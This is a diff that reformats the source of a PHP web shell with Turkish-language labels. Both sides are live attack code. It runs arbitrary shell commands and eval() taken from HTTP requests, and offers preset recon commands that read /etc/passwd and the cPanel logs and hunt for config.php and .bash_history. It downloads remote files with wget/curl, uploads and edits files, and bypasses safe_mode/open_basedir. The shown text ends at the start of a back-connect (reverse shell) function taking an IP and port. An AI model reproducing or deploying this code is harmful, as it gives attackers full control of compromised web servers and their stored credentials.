-        $mess="Make Dir/ Delete";
+        $mess = 'Make Dir/ Delete';
     }
 } elseif (isset($_REQUEST['deldir'])) {
-    $nrm=trim($_REQUEST['dir']);
-    if (is_dir($nrm)&& rmdir($nrm)) {
-        $mess=basename($nrm)." deleted successfully";
+    $nrm = trim($_REQUEST['dir']);
+    if (is_dir($nrm) && rmdir($nrm)) {
+        $mess = basename($nrm) . ' deleted successfully';
     } else {
-        $mess="Create/Delete Dir";
+        $mess = 'Create/Delete Dir';
     }
 } else {
-    $mess="Make Dir/ Delete";
+    $mess = 'Make Dir/ Delete';
 } if (isset($_REQUEST['crefile'])) {
-    $ncfile=trim($_REQUEST['cfile']);
-    if (!is_file($ncfile)&&touch($ncfile)) {
-        $mess3=basename($ncfile)." created succefully";
+    $ncfile = trim($_REQUEST['cfile']);
+    if (!is_file($ncfile) && touch($ncfile)) {
+        $mess3 = basename($ncfile) . ' created succefully';
         unset($_REQUEST['cfile']);
     } else {
-        $mess3= "Make a File/ Delete";
+        $mess3 = 'Make a File/ Delete';
     }
 } elseif (isset($_REQUEST['delfile'])) {
-    $ndfile=trim($_REQUEST['cfile']);
+    $ndfile = trim($_REQUEST['cfile']);
     if (unlink($ndfile)) {
-        $mess3=basename($ndfile)." deleted succefully";
+        $mess3 = basename($ndfile) . ' deleted succefully';
     } else {
-        $mess3= "Make Dir/ Delete";
+        $mess3 = 'Make Dir/ Delete';
     }
 } else {
-    $mess3="Make a File/ Delete";
+    $mess3 = 'Make a File/ Delete';
 }
 class upload
 {
     public function upload($file, $tmp)
     {
-        $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);
-        $nscdir=getcwd();
-        if (isset($_REQUEST["up"])) {
+        $nscdir = (!isset($_REQUEST['scdir'])) ? getcwd() : chdir($_REQUEST['scdir']);
+        $nscdir = getcwd();
+        if (isset($_REQUEST['up'])) {
             if (empty($upfile)) {
-                print "";
+                echo '';
             }
-            if (@copy($tmp, $nscdir."/".$file)) {
-                print "<div><center><b>:<font color=DeepSkyBlue  > $file </font>uploaded successfully :</b></center></div>";
+            if (@copy($tmp, $nscdir . '/' . $file)) {
+                echo "<div><center><b>:<font color=DeepSkyBlue  > $file </font>uploaded successfully :</b></center></div>";
             } else {
-                print "<center><b>: Error uploading<font color=red> $file </font>: </b></center>";
+                echo "<center><b>: Error uploading<font color=red> $file </font>: </b></center>";
             }
         }
     }
 }
-$obj=new upload($HTTP_POST_FILES['upfile']['name'], $HTTP_POST_FILES['upfile']['tmp_name']); if (isset($_REQUEST['ustsub'])) {
-    $ustname=trim($_REQUEST['ustname']);
+$obj = new upload($HTTP_POST_FILES['upfile']['name'], $HTTP_POST_FILES['upfile']['tmp_name']); if (isset($_REQUEST['ustsub'])) {
+    $ustname = trim($_REQUEST['ustname']);
     ob_start();
-    if ($_REQUEST['ustools']='t1') {
-        callfuncs('wget '.$ustname);
+    if ($_REQUEST['ustools'] = 't1') {
+        callfuncs('wget ' . $ustname);
     }
-    if ($_REQUEST['ustools']='t2') {
+    if ($_REQUEST['ustools'] = 't2') {
         callfuncs('curl -o basename($ustname) $ustname');
     }
-    if ($_REQUEST['ustools']='t3') {
+    if ($_REQUEST['ustools'] = 't3') {
         callfuncs('lynx -source $ustname > basename($ustname)');
     }
-    if ($_REQUEST['ustools']='t9') {
+    if ($_REQUEST['ustools'] = 't9') {
         callfuncs('GET $ustname > basename($ustname)');
     }
-    if ($_REQUEST['ustools']='t4') {
-        callfuncs('unzip '.$ustname);
+    if ($_REQUEST['ustools'] = 't4') {
+        callfuncs('unzip ' . $ustname);
     }
-    if ($_REQUEST['ustools']='t5') {
-        callfuncs('tar -xvf '.$ustname);
+    if ($_REQUEST['ustools'] = 't5') {
+        callfuncs('tar -xvf ' . $ustname);
     }
-    if ($_REQUEST['ustools']='t6') {
-        callfuncs('tar -zxvf '.$ustname);
+    if ($_REQUEST['ustools'] = 't6') {
+        callfuncs('tar -zxvf ' . $ustname);
     }
-    if ($_REQUEST['ustools']='t7') {
-        callfuncs('chmod 777 '.$ustname);
+    if ($_REQUEST['ustools'] = 't7') {
+        callfuncs('chmod 777 ' . $ustname);
     }
-    if ($_REQUEST['ustools']='t8') {
-        callfuncs('make '.$ustname);
+    if ($_REQUEST['ustools'] = 't8') {
+        callfuncs('make ' . $ustname);
     }
     ob_clean();
 }
-if (!isset($_REQUEST['cmd'])&&!isset($_REQUEST['eval'])&&!isset($_REQUEST['rfile'])&&!isset($_REQUEST['edit'])&&!isset($_REQUEST['subqcmnds'])&&!isset($_REQUEST['safefile'])&&!isset($_REQUEST['inifile'])&&!isset($_REQUEST['bip'])&&
+if (!isset($_REQUEST['cmd']) && !isset($_REQUEST['eval']) && !isset($_REQUEST['rfile']) && !isset($_REQUEST['edit']) && !isset($_REQUEST['subqcmnds']) && !isset($_REQUEST['safefile']) && !isset($_REQUEST['inifile']) && !isset($_REQUEST['bip']) &&
 !isset($_REQUEST['rfiletxt'])) {
-    if ($dh  = dir($nscdir)) {
-        while (true == ($filename =$dh->read())) {
+    if ($dh = dir($nscdir)) {
+        while (true == ($filename = $dh->read())) {
             $files[] = $filename;
             sort($files);
         }
-        print "<br>";
-        print"<center><table bgcolor=#2A2A2A style=\"border:1px solid black\" width=100% height=6% ></center>";
-        print "<tr><td width=43% style=\"border:1px solid black\">";
-        print "<center><b>Files";
-        print "</td>";
-        print "<td width=8% style=\"border:1px solid black\">";
-        print "<center><b>Size";
-        print "</td>";
-        print "<td width=3% style=\"border:1px solid black\">";
-        print "<center><b>Write";
-        print "</td>";
-        print "<td width=3% style=\"border:1px solid black\">";
-        print "<center><b>Read";
-        print "</td>";
-        print "<td width=5% style=\"border:1px solid black\">";
-        print "<center><b>Type";
-        print "</td>";
-        print "<td width=5% style=\"border:1px solid black\">";
-        print "<center><b>Edit";
-        print "</td>";
-        print "<td width=5% style=\"border:1px solid black\">";
-        print "<center><b>Rename";
-        print "</td>";
-        print "<td width=6% style=\"border:1px solid black\">";
-        print "<center><b>Download";
-        print "</td>";
-        if (strstr(PHP_OS, "Linux")) {
-            print "<td width=8% style=\"border:1px solid black\">";
-            print "<center><b>Owner";
-            print "</td>";
+        echo '<br>';
+        echo'<center><table bgcolor=#2A2A2A style="border:1px solid black" width=100% height=6% ></center>';
+        echo '<tr><td width=43% style="border:1px solid black">';
+        echo '<center><b>Files';
+        echo '</td>';
+        echo '<td width=8% style="border:1px solid black">';
+        echo '<center><b>Size';
+        echo '</td>';
+        echo '<td width=3% style="border:1px solid black">';
+        echo '<center><b>Write';
+        echo '</td>';
+        echo '<td width=3% style="border:1px solid black">';
+        echo '<center><b>Read';
+        echo '</td>';
+        echo '<td width=5% style="border:1px solid black">';
+        echo '<center><b>Type';
+        echo '</td>';
+        echo '<td width=5% style="border:1px solid black">';
+        echo '<center><b>Edit';
+        echo '</td>';
+        echo '<td width=5% style="border:1px solid black">';
+        echo '<center><b>Rename';
+        echo '</td>';
+        echo '<td width=6% style="border:1px solid black">';
+        echo '<center><b>Download';
+        echo '</td>';
+        if (strstr(PHP_OS, 'Linux')) {
+            echo '<td width=8% style="border:1px solid black">';
+            echo '<center><b>Owner';
+            echo '</td>';
         }
-        print "<td width=8% style=\"border:1px solid black\">";
-        print "<center><b>Permission";
-        print "</td></tr>";
+        echo '<td width=8% style="border:1px solid black">';
+        echo '<center><b>Permission';
+        echo '</td></tr>';
         foreach ($files as $nfiles) {
             if (is_file("$nscdir/$nfiles")) {
-                $scmess1=filesize("$nscdir/$nfiles");
+                $scmess1 = filesize("$nscdir/$nfiles");
             }
             if (is_writable("$nscdir/$nfiles")) {
-                $scmess2= "<center><font color=DeepSkyBlue  >yes";
+                $scmess2 = '<center><font color=DeepSkyBlue  >yes';
             } else {
-                $scmess2="<center><font color=red>Hayir";
+                $scmess2 = '<center><font color=red>Hayir';
             }
             if (is_readable("$nscdir/$nfiles")) {
-                $scmess3= "<center><font color=DeepSkyBlue  >yes";
+                $scmess3 = '<center><font color=DeepSkyBlue  >yes';
             } else {
-                $scmess3= "<center><font color=red>Hayir";
+                $scmess3 = '<center><font color=red>Hayir';
             }
             if (is_dir("$nscdir/$nfiles")) {
-                $scmess4= "<font color=red><center>Dir";
+                $scmess4 = '<font color=red><center>Dir';
             } else {
-                $scmess4= "<center><font color=DeepSkyBlue  >File";
+                $scmess4 = '<center><font color=DeepSkyBlue  >File';
             }
-            print"<tr><td style=\"border:1px solid black\">";
+            echo'<tr><td style="border:1px solid black">';
             if (is_dir($nfiles)) {
-                print "<font face= tahoma size=2 color=DeepSkyBlue  >[ $nfiles    ]<br>";
+                echo "<font face= tahoma size=2 color=DeepSkyBlue  >[ $nfiles    ]<br>";
             } else {
-                print "<font face= tahoma size=2 color=#dadada>$nfiles <br>";
+                echo "<font face= tahoma size=2 color=#dadada>$nfiles <br>";
             }
-            print"</td>";
-            print "<td style=\"border:1px solid black\">";
-            print "<center><font face= tahoma size=2 color=#dadada>";
+            echo'</td>';
+            echo '<td style="border:1px solid black">';
+            echo '<center><font face= tahoma size=2 color=#dadada>';
             if (is_dir("$nscdir/$nfiles")) {
-                print "<b>K</b>Dir";
+                echo '<b>K</b>Dir';
             } elseif (is_file("$nscdir/$nfiles")) {
                 readable_size($scmess1);
             } else {
-                print "---";
+                echo '---';
             }
-            print "</td>";
-            print "<td style=\"border:1px solid black\">";
-            print "<center><font face= tahoma size=2 >$scmess2";
-            print "</td>";
-            print"<td style=\"border:1px solid black\">";
-            print "<center><font face= tahoma size=2 >$scmess3";
-            print "</td>";
-            print "<td style=\"border:1px solid black\">";
-            print "<center><font face= tahoma size=2 >$scmess4";
-            print"</td>";
-            print "<td style=\"border:1px solid black\">";
+            echo '</td>';
+            echo '<td style="border:1px solid black">';
+            echo "<center><font face= tahoma size=2 >$scmess2";
+            echo '</td>';
+            echo'<td style="border:1px solid black">';
+            echo "<center><font face= tahoma size=2 >$scmess3";
+            echo '</td>';
+            echo '<td style="border:1px solid black">';
+            echo "<center><font face= tahoma size=2 >$scmess4";
+            echo'</td>';
+            echo '<td style="border:1px solid black">';
             if (is_file("$nscdir/$nfiles")) {
-                print " <center><a href=".inclink('dlink', 'edit')."&edit=$nfiles&scdir=$nscdir>Edit</a>";
+                echo ' <center><a href=' . inclink('dlink', 'edit') . "&edit=$nfiles&scdir=$nscdir>Edit</a>";
             } else {
-                print "<center><font face=tahoma size=2 color=gray>Düzenle</center>";
+                echo '<center><font face=tahoma size=2 color=gray>Düzenle</center>';
             }
-            print"</td>";
-            print "<td style=\"border:1px solid black\">";
-            print " <center><a href=".inclink('dlink', 'ren')."&ren=$nfiles&scdir=$nscdir>Rename</a>";
-            print"</td>";
-            print "<td style=\"border:1px solid black\">";
+            echo'</td>';
+            echo '<td style="border:1px solid black">';
+            echo ' <center><a href=' . inclink('dlink', 'ren') . "&ren=$nfiles&scdir=$nscdir>Rename</a>";
+            echo'</td>';
+            echo '<td style="border:1px solid black">';
             if (is_file("$nscdir/$nfiles")) {
-                print " <center><a href=".inclink('dlink', 'dwld')."&dwld=$nfiles&scdir=$nscdir>Download</a>";
+                echo ' <center><a href=' . inclink('dlink', 'dwld') . "&dwld=$nfiles&scdir=$nscdir>Download</a>";
             } else {
-                print "<center><font face=tahoma size=2 color=gray>indir</center>";
+                echo '<center><font face=tahoma size=2 color=gray>indir</center>';
             }
-            print"</td>";
-            if (strstr(PHP_OS, "Linux")) {
-                print "<td style=\"border:1px solid black\">";
-                print "<center><font face=tahoma size=2 color=#dadada>";
+            echo'</td>';
+            if (strstr(PHP_OS, 'Linux')) {
+                echo '<td style="border:1px solid black">';
+                echo '<center><font face=tahoma size=2 color=#dadada>';
                 owgr($nfiles);
-                print "</center>";
-                print"</td>";
+                echo '</center>';
+                echo'</td>';
             }
-            print "<td style=\"border:1px solid DeepSkyBlue  \">";
-            print "<center><div>";
+            echo '<td style="border:1px solid DeepSkyBlue  ">';
+            echo '<center><div>';
             permcol("$nscdir/$nfiles");
-            print "</div>";
-            print"</td>";
-            print "</tr>";
+            echo '</div>';
+            echo'</td>';
+            echo '</tr>';
         }
-        print "</table>";
-        print "<br>";
+        echo '</table>';
+        echo '<br>';
     } else {
-        print "<div><br><center><b>[ Can't open the Dir, permission denied !! ]<p>";
+        echo "<div><br><center><b>[ Can't open the Dir, permission denied !! ]<p>";
     }
-} elseif (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])||isset($_REQUEST['eval'])||isset($_REQUEST['subqcmnds'])) {
-    if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])) {
-        print "<div><b><center>[ Executed command ][$] : ".$_REQUEST['cmd']."</div></center>";
+} elseif (!isset($_REQUEST['rfile']) && isset($_REQUEST['cmd']) || isset($_REQUEST['eval']) || isset($_REQUEST['subqcmnds'])) {
+    if (!isset($_REQUEST['rfile']) && isset($_REQUEST['cmd'])) {
+        echo '<div><b><center>[ Executed command ][$] : ' . $_REQUEST['cmd'] . '</div></center>';
     }
-    print "<pre><center>".$sta;
+    echo '<pre><center>' . $sta;
     if (isset($_REQUEST['cmd'])) {
-        $cmd=trim($_REQUEST['cmd']);
+        $cmd = trim($_REQUEST['cmd']);
         callfuncs($cmd);
     } elseif (isset($_REQUEST['eval'])) {
         ob_start();
         eval(stripslashes(trim($_REQUEST['eval'])));
         $ret = ob_get_contents();
         ob_clean();
-        print htmlspecialchars($ret);
+        echo htmlspecialchars($ret);
     } elseif (isset($_REQUEST['subqcmnds'])) {
-        if ($_REQUEST['uscmnds']=='op1') {
+        if ('op1' == $_REQUEST['uscmnds']) {
             callfuncs('ls -lia');
         }
-        if ($_REQUEST['uscmnds']=='op2') {
+        if ('op2' == $_REQUEST['uscmnds']) {
             callfuncs('cat /etc/passwd');
         }
-        if ($_REQUEST['uscmnds']=='op3') {
+        if ('op3' == $_REQUEST['uscmnds']) {
             callfuncs('cat /var/cpanel/accounting.log');
         }
-        if ($_REQUEST['uscmnds']=='op4') {
+        if ('op4' == $_REQUEST['uscmnds']) {
             callfuncs('ls /var/named');
         }
-        if ($_REQUEST['uscmnds']=='op11') {
+        if ('op11' == $_REQUEST['uscmnds']) {
             callfuncs('find ../ -type d -perm -2 -ls');
         }
-        if ($_REQUEST['uscmnds']=='op12') {
+        if ('op12' == $_REQUEST['uscmnds']) {
             callfuncs('find ./ -type d -perm -2 -ls');
         }
-        if ($_REQUEST['uscmnds']=='op5') {
+        if ('op5' == $_REQUEST['uscmnds']) {
             callfuncs('find ./ -name service.pwd ');
         }
-        if ($_REQUEST['uscmnds']=='op6') {
+        if ('op6' == $_REQUEST['uscmnds']) {
             callfuncs('find ./ -name config.php');
         }
-        if ($_REQUEST['uscmnds']=='op7') {
+        if ('op7' == $_REQUEST['uscmnds']) {
             callfuncs('find / -type f -name .bash_history');
         }
-        if ($_REQUEST['uscmnds']=='op8') {
+        if ('op8' == $_REQUEST['uscmnds']) {
             callfuncs('cat /etc/hosts');
         }
-        if ($_REQUEST['uscmnds']=='op9') {
+        if ('op9' == $_REQUEST['uscmnds']) {
             callfuncs('finger root');
         }
-        if ($_REQUEST['uscmnds']=='op10') {
+        if ('op10' == $_REQUEST['uscmnds']) {
             callfuncs('netstat -an | grep -i listen');
         }
-        if ($_REQUEST['uscmnds']=='op13') {
+        if ('op13' == $_REQUEST['uscmnds']) {
             callfuncs('cat /etc/services');
         }
     }
-    print $eta."</center></pre>";
+    echo $eta . '</center></pre>';
 }
 function rdread($nscdir, $sf, $ef)
 {
-    $rfile=trim($_REQUEST['rfile']);
-    if (is_readable($rfile)&&is_file($rfile)) {
-        $fp=fopen($rfile, "r");
-        print"<center>";
-        print "<div><b>[ Editing <font color=DeepSkyBlue  >".basename($rfile)."</font> ] [<a href='javascript:history.back()'> Back </a>] [<a href=".inclink('dlink', 'rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>]</b></div><br>";
-        print $sf."<textarea cols=157 rows=23 name=rfiletxt>";
+    $rfile = trim($_REQUEST['rfile']);
+    if (is_readable($rfile) && is_file($rfile)) {
+        $fp = fopen($rfile, 'r');
+        echo'<center>';
+        echo '<div><b>[ Editing <font color=DeepSkyBlue  >' . basename($rfile) . "</font> ] [<a href='javascript:history.back()'> Back </a>] [<a href=" . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</b></div><br>";
+        echo $sf . '<textarea cols=157 rows=23 name=rfiletxt>';
         while (!feof($fp)) {
             $lines = fgetc($fp);
-            $nlines=htmlspecialchars($lines);
-            print $nlines;
+            $nlines = htmlspecialchars($lines);
+            echo $nlines;
         }
         fclose($fp);
-        print "</textarea>";
+        echo '</textarea>';
         if (is_writable($rfile)) {
-            print "<center><input type=hidden value=$rfile name=hidrfile><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>".$ef;
+            echo "<center><input type=hidden value=$rfile name=hidrfile><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>" . $ef;
         } else {
-            print "<div><b><center>[ Can't edit <font color=DeepSkyBlue  >".basename($rfile)."</font> ]</center></b></div><br>";
+            echo "<div><b><center>[ Can't edit <font color=DeepSkyBlue  >" . basename($rfile) . '</font> ]</center></b></div><br>';
         }
-        print "</center><br>";
-    } elseif (!file_exists($_REQUEST['rfile'])||!is_readable($_REQUEST['rfile'])||$_REQUEST['rfile']=$nscdir) {
-        print "<div><b><center>[ You selected a wrong file name or you don't have access !! ]</center></b></div><br>";
+        echo '</center><br>';
+    } elseif (!file_exists($_REQUEST['rfile']) || !is_readable($_REQUEST['rfile']) || $_REQUEST['rfile'] = $nscdir) {
+        echo "<div><b><center>[ You selected a wrong file name or you don't have access !! ]</center></b></div><br>";
     }
 }
 function rdsave($nscdir)
 {
-    $hidrfile=trim($_REQUEST['hidrfile']);
+    $hidrfile = trim($_REQUEST['hidrfile']);
     if (is_writable($hidrfile)) {
-        $rffp=fopen($hidrfile, "w+");
-        $rfiletxt=stripslashes($_REQUEST['rfiletxt']);
+        $rffp = fopen($hidrfile, 'w+');
+        $rfiletxt = stripslashes($_REQUEST['rfiletxt']);
 
         fwrite($rffp, $rfiletxt);
-        print "<div><b><center>
-[ <font color=DeepSkyBlue >".basename($hidrfile)."</font> Saved !! ]
-[<a href=".inclink('dlink', 'rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Edit again </a>]
+        echo '<div><b><center>
+[ <font color=DeepSkyBlue >' . basename($hidrfile) . '</font> Saved !! ]
+[<a href=' . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Edit again </a>]
 </center></b></div><br>";
         fclose($rffp);
     } else {
-        print "<div><b><center>[ Can't save the file !! ] [<a href=".inclink('dlink', 'rdcurrdir')."&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Back </a>]</center></b></div><br>";
+        echo "<div><b><center>[ Can't save the file !! ] [<a href=" . inclink('dlink', 'rdcurrdir') . "&scdir=$nscdir> Curr-Dir </a>] [<a href='javascript:history.back()'> Back </a>]</center></b></div><br>";
     }
 }
-if (isset($_REQUEST['rfile'])&&!isset($_REQUEST['cmd'])) {
+if (isset($_REQUEST['rfile']) && !isset($_REQUEST['cmd'])) {
     rdread($nscdir, $sf, $ef);
 } elseif (isset($_REQUEST['rfiletxt'])) {
     rdsave($nscdir);
@@ -819,25 +819,25 @@ function callperms($chkperms)
 {
     $perms = fileperms($chkperms);
 
-    if (($perms & 0xC000) == 0xC000) {
+    if (0xC000 == ($perms & 0xC000)) {
         // Socket
         $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
+    } elseif (0xA000 == ($perms & 0xA000)) {
         // Symbolic Link
         $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
+    } elseif (0x8000 == ($perms & 0x8000)) {
         // Regular
         $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
+    } elseif (0x6000 == ($perms & 0x6000)) {
         // Block special
         $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
+    } elseif (0x4000 == ($perms & 0x4000)) {
         // Directory
         $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
+    } elseif (0x2000 == ($perms & 0x2000)) {
         // Character special
         $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
+    } elseif (0x1000 == ($perms & 0x1000)) {
         // FIFO pipe
         $info = 'p';
     } else {
@@ -865,157 +865,157 @@ function callperms($chkperms)
     $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') :
            (($perms & 0x0200) ? 'T' : '-'));
-    print $info;
+    echo $info;
 }
 
           function readable_size($size)
           {
               if ($size < 1024) {
-                  print $size . ' B';
+                  echo $size . ' B';
               } else {
-                  $units = array("kB", "MB", "GB", "TB");
+                  $units = ['kB', 'MB', 'GB', 'TB'];
                   foreach ($units as $unit) {
                       $size = ($size / 1024);
                       if ($size < 1024) {
                           break;
                       }
                   }
-                  printf("%.2f", $size);
-                  print ' ' . $unit;
+                  printf('%.2f', $size);
+                  echo ' ' . $unit;
               }
           }
-if ($dlink=='ren'&&!isset($_REQUEST['rensub'])) {
-    print "<div><b><center>[<a href=".$PHP_SELF."?scdir=$nscdir> Back </a>]</div>";
-    print "<center>".$sf;
-    input("text", "ren", $_REQUEST['ren'], 20);
-    print " ";
-    input("text", "renf", "New-name", 20);
-    print " ";
-    input("submit", "rensub", "Rename", "");
-    print $ef;
+if ('ren' == $dlink && !isset($_REQUEST['rensub'])) {
+    echo '<div><b><center>[<a href=' . $PHP_SELF . "?scdir=$nscdir> Back </a>]</div>";
+    echo '<center>' . $sf;
+    input('text', 'ren', $_REQUEST['ren'], 20);
+    echo ' ';
+    input('text', 'renf', 'New-name', 20);
+    echo ' ';
+    input('submit', 'rensub', 'Rename', '');
+    echo $ef;
     die();
 } else {
-    print "";
+    echo '';
 }
-if (isset($_REQUEST['ren'])&&isset($_REQUEST['renf'])) {
-    if (rename($nscdir."/".$_REQUEST['ren'], $nscdir."/".$_REQUEST['renf'])) {
-        print"<center><div><b>[ ". $_REQUEST['ren']." is renamed to " .$sfnt.$_REQUEST['renf'].$efnt." successfully ]</center></div></b>";
-        print "<div><b><center>[<a href=".inclink('dlink', 'rcurrdir')."&scdir=$nscdir> Curr-dir </a>]</div>";
+if (isset($_REQUEST['ren']) && isset($_REQUEST['renf'])) {
+    if (rename($nscdir . '/' . $_REQUEST['ren'], $nscdir . '/' . $_REQUEST['renf'])) {
+        echo'<center><div><b>[ ' . $_REQUEST['ren'] . ' is renamed to ' . $sfnt . $_REQUEST['renf'] . $efnt . ' successfully ]</center></div></b>';
+        echo '<div><b><center>[<a href=' . inclink('dlink', 'rcurrdir') . "&scdir=$nscdir> Curr-dir </a>]</div>";
         die();
     } else {
-        print "<div><b><center>[ Yeniden Adlandirilamiyor ]</div>";
-        print "<div><b><center>[<a href=".inclink('dlink', 'rcurrdir')."&scdir=$nscdir> Back </a>]</div>";
+        echo '<div><b><center>[ Yeniden Adlandirilamiyor ]</div>';
+        echo '<div><b><center>[<a href=' . inclink('dlink', 'rcurrdir') . "&scdir=$nscdir> Back </a>]</div>";
         die();
     }
 }function fget($nscdir, $sf, $ef)
 {
-    print "<center>";
-    print "<div><b>[ Editing <font color=DeepSkyBlue >".basename($_REQUEST['edit'])."</font> ] [<a href='javascript:history.back()'> Back </a>] [<a href=".inclink('dlink', 'scurrdir')."&scdir=$nscdir> Curr-Dir </a>]</b></div>";
-    print $sf."<textarea cols=157 rows=23 name=edittxt>";
-    $alltxt= file_get_contents($_REQUEST['edit']);
-    $nalltxt=htmlspecialchars($alltxt);
-    print $nalltxt;
-    print "</textarea></center>";
+    echo '<center>';
+    echo '<div><b>[ Editing <font color=DeepSkyBlue >' . basename($_REQUEST['edit']) . "</font> ] [<a href='javascript:history.back()'> Back </a>] [<a href=" . inclink('dlink', 'scurrdir') . "&scdir=$nscdir> Curr-Dir </a>]</b></div>";
+    echo $sf . '<textarea cols=157 rows=23 name=edittxt>';
+    $alltxt = file_get_contents($_REQUEST['edit']);
+    $nalltxt = htmlspecialchars($alltxt);
+    echo $nalltxt;
+    echo '</textarea></center>';
     if (is_writable($_REQUEST['edit'])) {
-        print "<center><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>".$ef;
+        echo "<center><input type=submit value='Save-file' > <input type=reset value='Reset' ></center>" . $ef;
     } else {
-        print "<div><b><center>[ Can't edit 
-<font color=DeepSkyBlue >".basename($_REQUEST['edit'])."</font> ]</center></b></div><br>";
+        echo "<div><b><center>[ Can't edit 
+<font color=DeepSkyBlue >" . basename($_REQUEST['edit']) . '</font> ]</center></b></div><br>';
     }
 }function svetxt()
 {
-    $fp=fopen($_REQUEST['edit'], "w");
+    $fp = fopen($_REQUEST['edit'], 'w');
     if (is_writable($_REQUEST['edit'])) {
-        $nedittxt=stripslashes($_REQUEST['edittxt']);
+        $nedittxt = stripslashes($_REQUEST['edittxt']);
         fwrite($fp, $nedittxt);
-        print "<div><b><center>[ <font color=DeepSkyBlue  >".basename($_REQUEST['edit'])."</font> Saved !! ]</center></b></div>";
+        echo '<div><b><center>[ <font color=DeepSkyBlue  >' . basename($_REQUEST['edit']) . '</font> Saved !! ]</center></b></div>';
         fclose($fp);
     } else {
-        print "<div><b><center>[ Can't save the file !! ]</center></b></div>";
+        echo "<div><b><center>[ Can't save the file !! ]</center></b></div>";
     }
 }
-if ($dlink=='edit'&&!isset($_REQUEST['edittxt'])&&!isset($_REQUEST['rfile'])&&!isset($_REQUEST['cmd'])&&!isset($_REQUEST['subqcmnds'])&&!isset($_REQUEST['eval'])) {
+if ('edit' == $dlink && !isset($_REQUEST['edittxt']) && !isset($_REQUEST['rfile']) && !isset($_REQUEST['cmd']) && !isset($_REQUEST['subqcmnds']) && !isset($_REQUEST['eval'])) {
     fget($nscdir, $sf, $ef);
 } elseif (isset($_REQUEST['edittxt'])) {
     svetxt();
     fget($nscdir, $sf, $ef);
 } else {
-    print "";
+    echo '';
 }function owgr($file)
 {
-    $fileowneruid=fileowner($file);
-    $fileownerarray=posix_getpwuid($fileowneruid);
-    $fileowner=$fileownerarray['name'];
-    $fileg=filegroup($file);
+    $fileowneruid = fileowner($file);
+    $fileownerarray = posix_getpwuid($fileowneruid);
+    $fileowner = $fileownerarray['name'];
+    $fileg = filegroup($file);
     $groupinfo = posix_getgrgid($fileg);
-    $filegg=$groupinfo['name'];
-    print "$fileowner/$filegg";
-}$cpyf=trim($_REQUEST['cpyf']);$ftcpy=trim($_REQUEST['ftcpy']);$cpmv= $cpyf.'/'.$ftcpy; if (isset($_REQUEST['cpy'])) {
+    $filegg = $groupinfo['name'];
+    echo "$fileowner/$filegg";
+}$cpyf = trim($_REQUEST['cpyf']); $ftcpy = trim($_REQUEST['ftcpy']); $cpmv = $cpyf . '/' . $ftcpy; if (isset($_REQUEST['cpy'])) {
     if (copy($ftcpy, $cpmv)) {
-        $cpmvmess=basename($ftcpy)." copied successfully";
+        $cpmvmess = basename($ftcpy) . ' copied successfully';
     } else {
-        $cpmvmess="Can't copy ".basename($ftcpy);
+        $cpmvmess = "Can't copy " . basename($ftcpy);
     }
 } elseif (isset($_REQUEST['mve'])) {
-    if (copy($ftcpy, $cpmv)&&unlink($ftcpy)) {
-        $cpmvmess= basename($ftcpy)." moved successfully";
+    if (copy($ftcpy, $cpmv) && unlink($ftcpy)) {
+        $cpmvmess = basename($ftcpy) . ' moved successfully';
     } else {
-        $cpmvmess="Can't move ".basename($ftcpy);
+        $cpmvmess = "Can't move " . basename($ftcpy);
     }
 } else {
-    $cpmvmess="COPY / Select a file for copy then paste";
+    $cpmvmess = 'COPY / Select a file for copy then paste';
 }
 if (isset($_REQUEST['safefile'])) {
-    $file=$_REQUEST['safefile'];
-    $tymczas="";
+    $file = $_REQUEST['safefile'];
+    $tymczas = '';
     if (empty($file)) {
         if (empty($_GET['file'])) {
             if (empty($_POST['file'])) {
-                print "<center>[ Please choose a file first to read it using copy() ]</center>";
+                echo '<center>[ Please choose a file first to read it using copy() ]</center>';
             } else {
-                $file=$_POST['file'];
+                $file = $_POST['file'];
             }
         } else {
-            $file=$_GET['file'];
+            $file = $_GET['file'];
         }
     }
-    $temp=tempnam($tymczas, "cx");
-    if (copy("compress.zlib://".$file, $temp)) {
-        $zrodlo = fopen($temp, "r");
+    $temp = tempnam($tymczas, 'cx');
+    if (copy('compress.zlib://' . $file, $temp)) {
+        $zrodlo = fopen($temp, 'r');
         $tekst = fread($zrodlo, filesize($temp));
         fclose($zrodlo);
-        echo "<center><pre>".$sta.htmlspecialchars($tekst).$eta."</pre></center>";
+        echo '<center><pre>' . $sta . htmlspecialchars($tekst) . $eta . '</pre></center>';
         unlink($temp);
     } else {
-        print "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
+        echo "<FONT COLOR=\"RED\"><CENTER>Sorry, Can't read the selected file !!
 </CENTER></FONT><br>";
     }
 } if (isset($_REQUEST['inifile'])) {
-    ini_restore("safe_mode");
-    ini_restore("open_basedir");
-    print "<center><pre>".$sta;
-    if (include(htmlspecialchars($_REQUEST['inifile']))) {
+    ini_restore('safe_mode');
+    ini_restore('open_basedir');
+    echo '<center><pre>' . $sta;
+    if (include htmlspecialchars($_REQUEST['inifile'])) {
     } else {
-        print "Sorry, can't read the selected file !!";
+        echo "Sorry, can't read the selected file !!";
     }
-    print $eta."</pre></center>";
+    echo $eta . '</pre></center>';
 }
-if (isset($_REQUEST['bip'])&&isset($_REQUEST['bport'])) {
+if (isset($_REQUEST['bip']) && isset($_REQUEST['bport'])) {
     callback($nscdir, $_REQUEST['bip'], $_REQUEST['bport']);
 }
 function callback($nscdir, $bip, $bport)
 {
